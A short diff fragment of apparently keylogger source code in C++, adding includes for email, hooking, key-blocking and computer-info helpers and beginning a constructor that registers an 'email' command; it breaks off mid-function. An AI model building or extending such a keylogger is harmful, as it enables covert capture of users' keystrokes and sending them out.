@@ -1,6 +1,12 @@
 #include "stdafx.h"
 #include "Keylogger.h"
 
+#include "EmailService.h"
+#include "Hook.h"
+#include "StringHelper.h"
+#include "CommandParser.h"
+#include "KeyBlockService.h"
+#include "ComputerInfoHelper.h"
 
 Keylogger::Keylogger() {
     CommandParser::addCommand(L"email", [this](std::wstring argStr) {
